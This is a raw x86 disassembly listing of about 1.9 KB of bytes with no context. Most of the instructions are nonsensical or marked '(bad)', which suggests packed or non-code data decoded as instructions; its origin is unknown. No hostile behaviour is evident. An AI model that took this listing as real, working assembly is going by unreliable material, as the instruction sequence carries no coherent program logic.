  4416c2:	or     esp,DWORD PTR [edi]
  4416c4:	mov    ?,edi
  4416c6:	mov    bh,0x98
  4416c8:	fs dec ecx
  4416ca:	test   BYTE PTR [eax+0x6a],dl
  4416cd:	jns    0x4416cf
  4416cf:	add    BYTE PTR [eax],al
  4416d1:	add    BYTE PTR [eax],al
  4416d3:	cwde   
  4416d4:	lods   al,BYTE PTR ds:[esi]
  4416d5:	dec    ebp
  4416d6:	test   bh,cl
  4416d8:	fwait
  4416d9:	iret   
  4416da:	ja     0x44165f
  4416dc:	push   edi
  4416dd:	stc    
  4416de:	xor    al,0x60
  4416e0:	dec    edx
  4416e1:	pop    es
  4416e2:	jno    0x441670
  4416e4:	adc    BYTE PTR [ecx+esi*2-0x60],0x72
  4416e9:	xchg   edi,eax
  4416eb:	nop
  4416ec:	fwait
  4416ed:	or     eax,0xc8109874
  4416f2:	ja     0x441687
  4416f4:	les    esp,FWORD PTR [ecx+edx*2-0x7c]
  4416f8:	mov    dl,0x74
  4416fa:	out    dx,al
  4416fb:	xor    DWORD PTR [edx-0x4c007a08],0xfffffff7
  441702:	add    eax,ebp
  441704:	sub    al,0xf0
  441706:	add    ecx,DWORD PTR [ecx-0x6ffb93c9]
  44170c:	mov    dl,0x5c
  44170e:	(bad)  
  44170f:	stos   DWORD PTR es:[edi],eax
  441710:	cmp    DWORD PTR [ecx],esi
  441712:	in     al,dx
  441713:	adc    dh,BYTE PTR [ebx+0x22]
  441716:	cld    
  441717:	adc    bh,BYTE PTR [eax+eiz*8-0x79]
  44171b:	push   cs
  44171c:	mov    bl,0xf7
  44171e:	add    ecx,DWORD PTR [ecx-0x4d]
  441721:	aaa    
  441722:	add    al,0x90
  441724:	aaa    
  441725:	mov    bh,0xf7
  441727:	mov    fs,WORD PTR [eax]
  441729:	cld    
  44172a:	sub    cl,cl
  44172c:	and    ebp,ebx
  44172e:	jp     0x441799
  441730:	sub    bh,BYTE PTR [ebx+0x6f]
  441733:	cwde   
  441734:	ss jno 0x44173c
  441737:	add    BYTE PTR [eax],al
  441739:	add    BYTE PTR [eax],al
  44173b:	add    BYTE PTR [eax+0x17865cb2],dl
  441741:	mov    bl,0xf7
  441743:	add    ecx,ebp
  441745:	div    DWORD PTR [edi-0x888e686]
  44174b:	add    edx,DWORD PTR [eax+0xcc7a1c1]
  441751:	inc    ebp
  441752:	arpl   WORD PTR [eax+edx*4],ax
  441755:	mov    dl,0xcd
  441757:	add    edx,DWORD PTR [edi+0x2]
  44175a:	xchg   BYTE PTR [eax+0x3f73b11],al
  441760:	nop
  441761:	add    al,BYTE PTR [eax]
  441763:	ffreep st(7)
  441765:	mov    dl,0xf7
  441767:	adc    BYTE PTR [ebx-0x3a],0x72
  44176b:	inc    esp
  44176c:	mov    BYTE PTR [edi],dh
  44176e:	mov    dl,0x4
  441770:	nop
  441771:	mov    dl,0x5c
  441773:	(bad)  
  441774:	adc    al,0x44
  441776:	push   cs
  441777:	cmp    eax,0x620eb28c
  44177c:	push   ss
  44177d:	push   ecx
  44177e:	push   cs
  44177f:	jmp    0x72841b17
  441784:	int    0x39
  441786:	push   cs
  441787:	jmp    0xce83141f
  44178c:	in     al,0x2e
  44178e:	rcr    ecx,cl
  441790:	push   0x73
  441792:	sbb    DWORD PTR [ebx+edi*2-0x53],esp
  441796:	jmp    0x1e07c284
  44179b:	test   eax,0x704f2894
  4417a0:	add    BYTE PTR [eax],al
  4417a2:	add    BYTE PTR [eax],al
  4417a4:	add    BYTE PTR ds:0xc1f97b1,bh
  4417aa:	mov    esp,0x28a52d50
  4417af:	addr16 lock aad 0x28
  4417b3:	xchg   esi,eax
  4417b4:	outs   dx,DWORD PTR ds:[esi]
  4417b5:	sub    ebp,DWORD PTR [ebp+0x6d18e9e9]
  4417bb:	sbb    DWORD PTR [ebp+0x6b],ebp
  4417be:	lods   eax,DWORD PTR ds:[esi]
  4417bf:	jmp    0xd6af2aad
  4417c4:	jmp    0xd452ca5c
  4417c9:	mov    esi,0xc6e5e72d
  4417ce:	xor    bh,ch
  4417d0:	jmp    0xafd9ca68
  4417d5:	mov    esi,DWORD PTR [edi]
  4417d7:	pop    eax
  4417d8:	fxch   st(1)
  4417da:	scas   al,BYTE PTR es:[edi]
  4417db:	call   0x27a4:0x97fc8f9f
  4417e2:	xor    al,0x5b
  4417e4:	stc    
  4417e5:	cmp    edi,edi
  4417e7:	les    ebx,FWORD PTR [esi]
  4417e9:	(bad)  
  4417ea:	xor    al,0x53
  4417ec:	loope  0x441806
  4417ee:	ins    BYTE PTR es:[edi],dx
  4417ef:	data16 fcom QWORD PTR [edx]
  4417f2:	sub    cl,BYTE PTR [ebx]
  4417f4:	add    BYTE PTR [ecx-0x5c],ch
  4417f7:	push   cs
  4417f8:	(bad)  
  4417f9:	xor    al,0xa8
  4417fb:	in     al,0xff
  4417fd:	pop    esi
  4417fe:	push   ds
  4417ff:	xchg   ebx,eax
  441800:	pop    esi
  441801:	inc    ecx
  441802:	loope  0x4417d2
  441804:	mov    esi,DWORD PTR [edx-0x36]
  441807:	gs hlt 
  441809:	add    BYTE PTR [eax],al
  44180b:	add    BYTE PTR [eax],al
  44180d:	add    dl,al
  44180f:	out    dx,al
  441810:	add    al,cl
  441812:	cmp    BYTE PTR [esi-0x5960748f],bl
  441818:	nop
  441819:	inc    ebp
  44181a:	stc    
  44181b:	mov    edi,0x73a26c4c
  441820:	sbb    DWORD PTR [edi-0x77],edx
  441823:	jg     0x441816
  441825:	pop    ecx
  441826:	xchg   ebx,eax
  441827:	mov    dh,0xe
  441829:	sub    DWORD PTR [edi-0x60016ca],ebp
  44182f:	sub    bh,BYTE PTR ds:0x797470f0
  441835:	sbb    DWORD PTR [edi-0x160016c6],eax
  44183b:	retf   0xf445
  44183e:	bound  esi,QWORD PTR [ebx+0x11]
  441841:	add    DWORD PTR [edx+eiz*1+0x6b],edi
  441845:	clc    
  441846:	call   0xa9c97aee
  44184b:	mov    ds:0x2ae2eb63,eax
  441850:	push   eax
  441851:	or     BYTE PTR [esi+esi*8],dh
  441854:	pop    esp
  441855:	or     BYTE PTR [edx],dh
  441857:	ins    BYTE PTR es:[edi],dx
  441858:	popa   
  441859:	or     edi,edi
  44185b:	fwait
  44185c:	pop    ebp
  44185d:	data16 and bl,BYTE PTR [ebp+edi*8-0x145f9ec6]
  441865:	mov    ah,BYTE PTR [ecx-0x1f]
  441868:	into   
  441869:	test   DWORD PTR [esi-0x56],ebp
  44186c:	(bad)  
  44186d:	jmp    0x0:0x512c7a
  441874:	add    BYTE PTR [eax],al
  441876:	add    BYTE PTR [eax+0xa03c110],dl
  44187c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44187d:	std    
  44187e:	test   dh,al
  441880:	mov    DWORD PTR [ebp+0x13],esp
  441883:	cwde   
  441884:	pop    ecx
  441885:	ss shl edx,0xb4
  441889:	addr16 inc ecx
  44188b:	adc    BYTE PTR [eax],0xa9
  44188e:	outs   dx,DWORD PTR ds:[esi]
  44188f:	mov    edi,0xcdfe57c8
  441894:	add    ebx,eax
  441896:	dec    esi
  441897:	mov    eax,ds:0x29e7eee3
  44189c:	mov    dl,0x12
  44189e:	add    BYTE PTR [ecx+0x33],ch
  4418a1:	(bad)  
  4418a2:	jmp    FWORD PTR [edi]
  4418a4:	cdq    
  4418a5:	fs inc ecx
  4418a7:	mov    al,ds:0x90839b82
  4418ac:	cdq    
  4418ad:	or     eax,0x4a19627
  4418b2:	jp     0x441858
  4418b4:	call   0xff16:0xc3910ffb
  4418bb:	jge    0x44185e
  4418bd:	or     al,0x7b
  4418bf:	hlt    
  4418c0:	pop    ss
  4418c1:	cld    
  4418c2:	adc    edx,DWORD PTR [eax-0x19b06d64]
  4418c8:	and    edi,DWORD PTR [ebx-0x7c]
  4418cb:	push   ebp
  4418cc:	sbb    eax,0x203654db
  4418d1:	jno    0x44192d
  4418d3:	rcr    BYTE PTR [ebp+ecx*1+0x52c86b59],cl
  4418da:	pop    ecx
  4418db:	add    BYTE PTR [eax],al
  4418dd:	add    BYTE PTR [eax],al
  4418df:	add    BYTE PTR [ebx],cl
  4418e1:	neg    al
  4418e3:	mov    ebp,0x54da9984
  4418e8:	adc    esp,ecx
  4418ea:	jp     0x441945
  4418ec:	sbb    edi,esi
  4418ee:	fdivr  DWORD PTR [ebp-0x34d66674]
  4418f4:	les    esi,FWORD PTR [ecx+0x775b3f23]
  4418fa:	cmp    edi,DWORD PTR [edi]
  4418fc:	pop    ebx
  4418fd:	ja     0x4418a9
  4418ff:	js     0x44196c
  441901:	push   es
  441902:	mov    eax,ds:0xa4bafa78
  441907:	dec    eax
  441908:	adc    ch,BYTE PTR [edx+0x37c8fa62]
  44190e:	mov    ah,0x89
  441910:	les    eax,FWORD PTR [edi]
  441912:	ss pop es
  441914:	nop
  441915:	add    BYTE PTR [ebp-0x4d],bl
  441918:	outs   dx,DWORD PTR ds:[esi]
  441919:	mov    bl,0xf7
  44191b:	add    edx,DWORD PTR [ebx]
  44191d:	mov    eax,ds:0xf10afe4a
  441922:	pop    ebp
  441923:	retf   0xdd8
  441926:	xor    eax,DWORD PTR [esi-0x6d]
  441929:	mov    dl,0x5c
  44192b:	and    BYTE PTR [edi-0x6afc084e],0x30
  441932:	jae    0x441938
  441934:	nop
  441935:	mov    dl,0xa
  441937:	pop    ss
  441938:	(bad)  
  441939:	dec    eax
  44193a:	lahf   
  44193b:	add    al,0x90
  44193d:	mov    dl,0xa
  44193f:	call   DWORD PTR [ecx+edi*8]
  441942:	pop    es
  441943:	das    
  441944:	add    BYTE PTR [eax],al
  441946:	add    BYTE PTR [eax],al
  441948:	add    BYTE PTR [edx+0x1e],cl
  44194b:	in     al,dx
  44194c:	push   es
  44194d:	sbb    ecx,DWORD PTR [ebx]
  44194f:	inc    ecx
  441950:	jg     0x4418d3
  441952:	add    al,0xe
  441954:	add    al,0xd9
  441956:	mov    edi,0xb253deeb
  44195b:	je     0x44199d
  44195d:	xchg   edi,eax
  44195e:	xor    eax,0x718fbbc9
  441963:	stc    
  441964:	add    edx,DWORD PTR [eax-0x710f084e]
  44196a:	aaa    
  44196b:	mov    ecx,0x879a5fff
  441970:	pop    eax
  441971:	test   al,0xa9
  441973:	push   cs
  441974:	lahf   
  441975:	mov    ebp,0xdba7d0a9
  44197a:	test   eax,0xab93e9e9
  44197f:	add    ecx,DWORD PTR [ebp+0x6a0ef566]
  441985:	shl    BYTE PTR [ecx-0x76ecd9b8],1
  44198b:	push   cs
  44198c:	jmp    0xe952cc24
  441991:	xchg   ebx,eax
  441992:	or     edx,DWORD PTR [esi-0x32f3b0d6]
  441998:	in     eax,0x93
  44199a:	jbe    0x441976
  44199c:	mov    ch,0x87
  44199e:	jge    0x44197a
  4419a0:	lods   eax,DWORD PTR ds:[esi]
  4419a1:	jg     0x441a20
  4419a3:	fidivr DWORD PTR [edi+edi*4]
  4419a6:	popf   
  4419a7:	(bad)  
  4419a8:	mov    ebp,0xe9e9a83f
  4419ad:	add    BYTE PTR [eax],al
  4419af:	add    BYTE PTR [eax],al
  4419b1:	add    BYTE PTR [esi+0x3],al
  4419b4:	inc    edx
  4419b5:	jb     0x441954
  4419b7:	pusha  
  4419b8:	adc    eax,0x9bb293e9
  4419bd:	ins    BYTE PTR es:[edi],dx
  4419be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4419bf:	stos   DWORD PTR es:[edi],eax
  4419c0:	jmp    0x9598a06b
  4419c5:	sub    al,0x4
  4419c7:	unpcklps xmm7,XMMWORD PTR [eax]
  4419ca:	jns    0x441a10
  4419cc:	loop   0x44195d
  4419ce:	push   0xffffffaa
  4419d0:	cmp    al,0xba
  4419d2:	pop    esi
  4419d3:	xor    BYTE PTR [ebx-0x16558537],dl
  4419d9:	or     DWORD PTR [esi-0x1c],0xab9ee90e
  4419e0:	lea    ebp,ds:0x5932fc7
  4419e6:	cmp    ebp,DWORD PTR [edx-0x45aced17]
  4419ec:	xchg   edx,eax
  4419ed:	pop    edi
  4419ee:	mov    ?,WORD PTR [edx+0x2a09000e]
  4419f4:	(bad)  
  4419f5:	hlt    
  4419f6:	addr16 sbb al,0xe7
  4419f9:	push   eax
  4419fa:	push   ecx
  4419fb:	fdivr  st,st(1)
  4419fd:	jmp    DWORD PTR [esi+0x28]
  441a00:	cld    
  441a01:	mov    eax,ecx
  441a03:	xor    ch,cl
  441a05:	or     BYTE PTR [edx-0x72ba6f16],al
  441a0b:	lods   al,BYTE PTR ds:[esi]
  441a0c:	lea    edx,[esi-0x74f14b98]
  441a12:	int3   
  441a13:	(bad)  
  441a14:	out    0xff,eax
  441a16:	add    BYTE PTR [eax],al
  441a18:	add    BYTE PTR [eax],al
  441a1a:	add    BYTE PTR [esi-0x7e],ah
  441a1d:	aas    
  441a1e:	push   eax
  441a1f:	sti    
  441a20:	sub    cl,BYTE PTR [ebp-0x18e5980c]
  441a26:	push   eax
  441a27:	(bad)  
  441a28:	lds    eax,FWORD PTR [bx+di]
  441a2b:	cmp    DWORD PTR [esi+ecx*1+0xed7f5e8],esi
  441a32:	add    BYTE PTR [edx-0x67b020e],ch
  441a38:	mov    ds:0x19e282ea,al
  441a3d:	xchg   ebx,eax
  441a3e:	test   DWORD PTR [ebp-0x4b0018e7],ecx
  441a44:	pop    edi
  441a45:	in     eax,0x51
  441a47:	test   BYTE PTR [edi],bl
  441a49:	fdivp  st(6),st
  441a4b:	es sbb dh,dl
  441a4e:	jge    0x441a64
  441a50:	sbb    ah,bh
  441a52:	sub    DWORD PTR ds:0xedc08db3,0xffffffae
  441a59:	imul   ecx,ebx,0x66
  441a5c:	and    eax,0x1966248d
  441a61:	out    0x8d,eax
  441a63:	jl     0x441a6f
  441a65:	pop    esp
  441a66:	lea    eax,[edx+eiz*1-0x18]
  441a6a:	jmp    DWORD PTR [esi+0x6]
  441a6d:	clc    
  441a6e:	in     eax,dx
  441a6f:	nop
  441a70:	add    BYTE PTR [eax+0x7c],bh
  441a73:	int3   
  441a74:	lea    ebp,[eax-0x41]
  441a77:	and    al,0x9c
  441a79:	xchg   edx,eax
  441a7a:	les    esp,FWORD PTR [edi+0xefaa16]
  441a80:	add    BYTE PTR [eax],al
  441a82:	add    BYTE PTR [eax],al
  441a84:	inc    eax
  441a85:	adc    al,0x6a
  441a87:	and    edx,DWORD PTR [edi+0x1d8a77d8]
  441a8d:	lds    esi,FWORD PTR [eax+edi*8-0x79]
  441a91:	rcl    DWORD PTR [edi-0x15],0x7f
  441a95:	rcl    BYTE PTR [ebx+0x530e8cc3],0x73
  441a9c:	xchg   ebx,eax
  441a9d:	sbb    al,0x2c
  441a9f:	clc    
  441aa0:	sbb    ecx,DWORD PTR [esi]
  441aa2:	das    
  441aa3:	stc    
  441aa4:	pop    edi
  441aa5:	mov    al,ds:0x4a604a60
  441aaa:	pusha  
  441aab:	mov    al,BYTE PTR [edi+ecx*4+0x76]
  441aaf:	clc    
  441ab0:	cmp    BYTE PTR [ecx+0x41],bl
  441ab3:	clc    
  441ab4:	aas    
  441ab5:	sbb    al,0x2a
  441ab7:	add    ecx,DWORD PTR ds:0x12fcf959
  441abd:	fs jbe 0x441a44
  441ac0:	or     eax,0x1ff877ad
  441ac5:	push   cs
  441ac6:	(bad)  
  441ac8:	ret    0x6106
  441acb:	repz push cs
  441acd:	push   eax
  441ace:	jbe    0x441ab7
  441ad0:	xchg   ecx,eax
  441ad1:	ss jbe 0x441acc
  441ad4:	adc    edx,DWORD PTR [ebp-0x17]
  441ad7:	adc    al,0xbc
  441ada:	adc    edi,DWORD PTR [ebp-0x25]
  441add:	das    
  441ade:	pusha  
  441adf:	inc    edx
  441ae0:	fmul   st(0),st
  441ae2:	imul   eax,DWORD PTR [edx-0x788df4c],0x0
  441ae9:	add    BYTE PTR [eax],al
  441aeb:	add    BYTE PTR [eax],al
  441aed:	add    eax,0xcff97a06
  441af2:	mov    cl,0x70
  441af4:	pop    ebx
  441af5:	in     eax,0x95
  441af7:	dec    eax
  441af8:	push   0x7efb6e3c
  441afd:	neg    DWORD PTR ds:0xa6d484f5
  441b03:	pop    esp
  441b04:	jle    0x441b79
  441b06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441b07:	sub    BYTE PTR [eax+0xa],ch
  441b0a:	xor    eax,0xa6986913
  441b0f:	xchg   BYTE PTR [esi+0x1a],dh
  441b12:	lahf   
  441b13:	xor    DWORD PTR [eax-0x78],ebp
  441b16:	fwait
  441b17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441b18:	push   esi
  441b19:	js     0x441ac1
  441b1b:	je     0x441b5c
  441b1d:	xchg   ebx,eax
  441b1e:	das    
  441b1f:	aaa    
  441b20:	out    dx,eax
  441b21:	ins    BYTE PTR es:[edi],dx
  441b22:	xor    DWORD PTR [eax+ebp*2],ebx
  441b25:	or     al,0x30
  441b27:	shr    DWORD PTR [eax+0x58],cl
  441b2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441b2b:	jb     0x441afb
  441b2d:	pop    edi
  441b2e:	add    DWORD PTR [ebx+0x76],ecx
  441b31:	inc    ebx
  441b32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441b33:	lock addr16 das 
  441b36:	in     al,0xda
  441b38:	cmp    BYTE PTR [bp+si],dh
  441b3b:	mov    ebx,0x43731300
  441b40:	add    ebp,DWORD PTR [ebp-0x2d842f87]
  441b46:	stos   BYTE PTR es:[edi],al
  441b47:	or     al,0x81
  441b49:	imul   esp,DWORD PTR [ebp-0x405d9860],0x6c
  441b50:	mov    ecx,0x0
  441b55:	add    BYTE PTR [ebx],cl
  441b57:	jmp    0xf188:0xa6093462
  441b5e:	xchg   ebp,eax
  441b5f:	jmp    0x441b63
  441b61:	jo     0x441ae5
  441b63:	scas   eax,DWORD PTR es:[edi]
  441b64:	mov    esi,0xfb1effe8
  441b69:	stos   BYTE PTR es:[edi],al
  441b6a:	(bad)  
  441b6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441b6c:	push   0xe301467
  441b71:	int    0x6e
  441b73:	stos   BYTE PTR es:[edi],al
  441b74:	jmp    0xea563cd5
  441b79:	data16 das 
  441b7b:	neg    DWORD PTR [ebx-0x1654bf94]
  441b81:	push   esi
  441b82:	push   esp
  441b83:	(bad)  
  441b84:	cli    
  441b85:	dec    esi
  441b86:	aaa    
  441b87:	es shr ebp,cl
  441b8a:	adc    BYTE PTR [esi+0x62],ah
  441b8d:	jmp    0x1a11:0x64e96f12
  441b94:	jmp    0xb06c:0x95f5f72e
  441b9b:	stos   DWORD PTR es:[edi],eax
  441b9c:	jmp    0xe27d14bf
  441ba1:	pop    ss
  441ba2:	out    dx,eax
  441ba3:	stos   BYTE PTR es:[edi],al
  441ba4:	mul    BYTE PTR [ecx]
  441ba6:	enter  0xe9aa,0x6a
  441baa:	shl    BYTE PTR [ecx-0x599fd66d],1
  441bb0:	mov    WORD PTR [edx],fs
  441bb2:	out    dx,eax
  441bb3:	sub    al,0xab
  441bb5:	mov    ch,0xb6
  441bb7:	stos   BYTE PTR es:[edi],al
  441bb8:	jmp    0x441c8d
  441bbd:	add    BYTE PTR [eax],al
  441bbf:	and    ah,BYTE PTR [ecx+ebp*8+0x3238bae9]
  441bc6:	(bad)  
  441bc7:	scas   al,BYTE PTR es:[edi]
  441bc8:	stos   BYTE PTR es:[edi],al
  441bc9:	aas    
  441bca:	pop    esp
  441bcb:	add    BYTE PTR [ecx-0x8513918],ah
  441bd1:	test   cl,0xb8
  441bd4:	stos   BYTE PTR es:[edi],al
  441bd5:	jmp    0xd672bd3c
  441bda:	push   0xffffffcf
  441bdc:	lods   eax,DWORD PTR ds:[esi]
  441bdd:	adc    eax,0xf2f084b7
  441be2:	adc    al,0x93
  441be4:	daa    
  441be5:	(bad)  
  441be6:	xchg   esi,eax
  441be7:	jp     0x441c29
  441be9:	xor    cl,BYTE PTR [esi+0x41aa76]
  441bef:	xchg   DWORD PTR [esi+0x5b],edi
  441bf2:	lea    esi,[ebp+edx*1-0x18]
  441bf6:	call   FWORD PTR [esi-0x7f]
  441bf9:	nop
  441bfa:	jge    0x441c19
  441bfc:	or     DWORD PTR [eax],eax
  441bfe:	xor    al,0xb9
  441c00:	mov    al,0x6b
  441c02:	(bad)  
  441c03:	lds    esi,FWORD PTR [ecx]
  441c05:	test   eax,0xd22faa74
  441c0a:	push   DWORD PTR [edx]
  441c0c:	xor    ch,BYTE PTR ds:0x950c4eff
  441c12:	dec    ebp
  441c13:	pop    ebp
  441c14:	jle    0x441baa
  441c16:	lea    edx,[ebp+0xf]
  441c19:	out    0xff,eax
  441c1b:	shl    esp,1
  441c1d:	repnz jmp FWORD PTR [esi+0x4cd30]
  441c24:	add    BYTE PTR [eax],al
  441c26:	add    BYTE PTR [eax],al
  441c28:	hlt    
  441c29:	out    dx,eax
  441c2a:	pop    ebp
  441c2b:	add    ebp,edx
  441c2d:	call   0xc438a818
  441c32:	out    0xff,eax
  441c34:	mov    gs,WORD PTR [edx]
  441c36:	cmp    eax,0x952afbf0
  441c3b:	hlt    
  441c3c:	pop    edi
  441c3d:	push   cs
  441c3e:	out    0xe8,eax
  441c40:	icebp  
  441c41:	or     bh,ah
  441c43:	(bad)  
  441c44:	mov    edx,0xe9850df2
  441c49:	mov    ds:0xdf282ea,al
  441c4e:	xchg   ebp,eax
  441c4f:	inc    ebp
  441c50:	inc    ebp
  441c51:	jg     0x441be5
  441c53:	test   DWORD PTR [ebp-0x530018f3],edx
  441c59:	sbb    ebx,esi
  441c5b:	(bad)  
  441c5c:	fimul  WORD PTR ds:0xdd229f2
  441c62:	out    0x83,eax
  441c64:	xor    eax,0xa5c08db3
  441c69:	mov    cl,0x6b
  441c6b:	retf   
  441c6c:	nop
  441c6d:	cmp    al,0x67
  441c6f:	xor    BYTE PTR [esp+esi*1-0x20ea078d],0x76
  441c77:	dec    esi
  441c78:	or     eax,0xd7f95f17
  441c7d:	sbb    al,0x4b
  441c7f:	add    eax,0x7c7414bb
  441c84:	int3   
  441c85:	xchg   ebp,eax
  441c86:	push   0x8e9844bf
  441c8b:	les    eax,FWORD PTR [eax]
  441c8d:	add    BYTE PTR [eax],al
  441c8f:	add    BYTE PTR [eax],al
  441c91:	mov    bh,0x10
  441c93:	(bad)  
  441c95:	sbb    eax,0x1b4f714f
  441c9a:	pop    ss
  441c9b:	das    
  441c9c:	stc    
  441c9d:	lahf   
  441c9e:	in     al,0x61
  441ca0:	mov    bl,BYTE PTR [ebx+ebx*8-0x1e6078d]
  441ca7:	push   es
  441ca8:	stc    
  441ca9:	xchg   esp,ecx
  441cab:	gs mov edx,0xf873c4c0
  441cb1:	push   0x6ff844dd
  441cb6:	sbb    BYTE PTR [edi+0x3],cl
  441cb9:	or     eax,0x12fcded9
  441cbe:	loopne 0x441d33
  441cc0:	test   ch,cl
  441cc2:	popf   
  441cc3:	push   ds
  441cc4:	(bad)  
  441cc5:	mov    ecx,DWORD PTR [esi]
  441cc7:	pop    es
  441cc8:	stc    
  441cc9:	inc    edi
  441cca:	mov    eax,?
  441ccc:	or     eax,0xf91e167b
  441cd1:	aaa    
  441cd2:	jl     0x441ccc
  441cd4:	add    eax,0x725ef669
  441cd9:	lea    esi,[edx-0x715b100f]
  441cdf:	mov    dh,0x96
  441ce1:	pop    ss
  441ce2:	pop    esp
  441ce3:	jb     0x441c69
  441ce5:	adc    eax,0x7f873ad
  441cea:	mov    dl,0x62
  441cec:	mov    dh,0xfb
  441cee:	add    BYTE PTR [ebx+0x76],bh
  441cf1:	add    esp,DWORD PTR [eax+eax*4+0x64]
  441cf8:	add    BYTE PTR [eax],al
  441cfa:	imul   DWORD PTR [eax+0x2ee8648d]
  441d00:	mov    ebx,0xe37212ff
  441d05:	add    BYTE PTR [ebp+0x77],dl
  441d08:	pusha  
  441d09:	js     0x441d6d
  441d0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441d0c:	dec    edx
  441d0d:	mov    esi,0x7e5d01cb
  441d12:	jae    0x441cb7
  441d14:	dec    eax
  441d15:	or     dh,BYTE PTR fs:0xa2a8654b
  441d1c:	outs   dx,BYTE PTR ds:[esi]
  441d1d:	mov    ?,WORD PTR [ebx]
  441d1f:	mov    ds:0x65166450,eax
  441d24:	mov    edi,0x4fa29864
  441d29:	cmp    BYTE PTR [ebp-0x5e],dh
  441d2c:	cmp    BYTE PTR [eax+0x437ab753],al
  441d32:	add    esi,DWORD PTR [esi+0x2e783874]
  441d38:	mov    dl,0x67
  441d3a:	adc    al,0x38
  441d3c:	shl    DWORD PTR [eax+ebp*2-0x5e],cl
  441d40:	bound  ecx,QWORD PTR [esi+0x63e8a1a3]
  441d46:	push   cs
  441d47:	xor    BYTE PTR [ebx-0x7a5db79c],dl
  441d4d:	jbe    0x441d69
  441d4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441d50:	icebp  
  441d51:	arpl   WORD PTR [eax],di
  441d53:	sub    al,0x8a
  441d55:	aam    0x38
  441d57:	mov    ds:0x8c656cc0,al
  441d5c:	fsub   DWORD PTR [ebx+0x0]
  441d5f:	add    BYTE PTR [eax],al
  441d61:	add    BYTE PTR [eax],al
  441d63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441d64:	jbe    0x441d61
  441d66:	mov    bh,bl
  441d68:	es cmc 
  441d6a:	xchg   BYTE PTR [edx+eiz*4+0xe],cl
  441d6e:	bound  ecx,QWORD PTR [ecx+0x73aeea0d]
  441d74:	ss stos DWORD PTR es:[edi],eax
  441d76:	or     eax,0x72e99a73
  441d7b:	or     DWORD PTR [edx],edx
  441d7d:	jmp    0x42ea:0xd4367396
  441d84:	scas   al,BYTE PTR es:[edi]
  441d85:	xchg   ebx,eax
  441d86:	adc    DWORD PTR [ebx-0x66],esi
  441d89:	jmp    0x1a536150
  441d8e:	(bad)  
  441d8f:	fst    DWORD PTR [ebp+0x61a6e561]
  441d95:	pop    esp
  441d96:	out    dx,eax
  441d97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441d98:	jns    0x441dbf
  441d9a:	inc    eax
  441d9b:	fadd   st,st(1)
  441d9d:	xchg   ebp,eax
  441d9e:	ins    BYTE PTR es:[edi],dx
  441d9f:	js     0x441d3c
  441da1:	jmp    0xfe7134f4
  441da6:	inc    ebp
  441da7:	xor    ebx,DWORD PTR [edx+0x4432983e]
  441dad:	push   ss
  441dae:	ss repz call 0xda48:0xfb94258d
  441db7:	rol    DWORD PTR [esi],cl
  441db9:	xchg   esi,eax
  441dba:	add    al,0x51
  441dbc:	pop    esi
  441dbd:	xchg   ebp,eax
  441dbe:	xor    DWORD PTR [edi+0x67379588],edi
  441dc4:	inc    esp
  441dc5:	pop    esi
  441dc6:	push   es
  441dc7:	add    BYTE PTR [eax],al
  441dc9:	add    BYTE PTR [eax],al
  441dcb:	add    bl,dh
  441dcd:	call   0xf676:0x44571e35
  441dd4:	mov    dl,0x9a
  441dd6:	jbe    0x441dd1
  441dd8:	xchg   ebx,eax
  441dd9:	mov    dl,0xe
  441ddb:	push   ebx
  441ddc:	xchg   ebp,eax
  441ddd:	icebp  
  441dde:	xchg   edi,eax
  441ddf:	jl     0x441d78
  441de1:	fwait
  441de2:	jmp    0x4e883abd
  441de7:	into   
  441de8:	mov    dl,0x9a
  441dea:	xchg   edi,eax
  441deb:	add    BYTE PTR [ecx+eiz*2+0x2dd6ffe6],ch
  441df2:	pushf  
  441df3:	pusha  
  441df4:	inc    esi
  441df5:	adc    al,0xe7
  441df7:	mov    DWORD PTR [edx+ebx*8+0x13d14d90],esp
  441dfe:	std    
  441dff:	addr16 mov ds:0xe96a,al
  441e03:	mov    ah,BYTE PTR [ecx]
  441e05:	cmp    ch,cl
  441e07:	or     al,0x6c
  441e09:	loopne 0x441e68
  441e0b:	adc    eax,0xec150
  441e10:	jmp    0x4838ba56
  441e15:	adc    al,0xe7
  441e17:	mov    eax,DWORD PTR [edx+0x68]
  441e1a:	cli    
  441e1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441e1c:	popa   
  441e1d:	enter  0xffdd,0x56
  441e21:	je     0x441e6a
  441e23:	mov    edi,DWORD PTR [edx+0x60]
  441e26:	xchg   edx,eax
  441e27:	in     eax,0xf4
  441e29:	not    ebp
  441e2b:	int3   
  441e2c:	gs icebp 
  441e2e:	aad    0xcc
  441e30:	add    BYTE PTR [eax],al
  441e32:	add    BYTE PTR [eax],al
  441e34:	add    BYTE PTR [ebp-0xf],ah
  441e37:	aad    0xcc
  441e39:	sub    al,0x31
  441e3b:	cmc    
  441e3c:	add    ebp,0xffffffcf
  441e3f:	cmp    al,0x8b
  441e41:	sbb    al,0xb0
  441e43:	cmp    eax,eax
  441e45:	jb     0x441e4b
  441e47:	pop    esi
  441e48:	sub    eax,0x113f2e
  441e4d:	jns    0x441e03
  441e4f:	xchg   ebp,eax
  441e50:	jge    0x441ecf
  441e52:	or     BYTE PTR [ebp-0x6f03d377],ch
  441e58:	inc    ebp
  441e59:	inc    ebp
  441e5a:	cs dec esp
  441e5c:	or     BYTE PTR [ecx],ch
  441e5e:	cmp    al,0xe8
  441e60:	jmp    FWORD PTR [ecx]
  441e62:	mov    ah,0x95
  441e64:	push   ebp
  441e65:	std    
  441e66:	push   cs
  441e67:	push   0x6f8890fb
  441e6c:	jl     0x441eba
  441e6e:	xchg   esi,eax
  441e6f:	into   
  441e70:	pop    ecx
  441e71:	or     ebp,DWORD PTR [edi-0x57]
  441e74:	mov    ebp,0x4a9a8988
  441e79:	cwde   
  441e7a:	mov    edx,0x8a07fe8a
  441e7f:	or     eax,0xf341e22d
  441e84:	hlt    
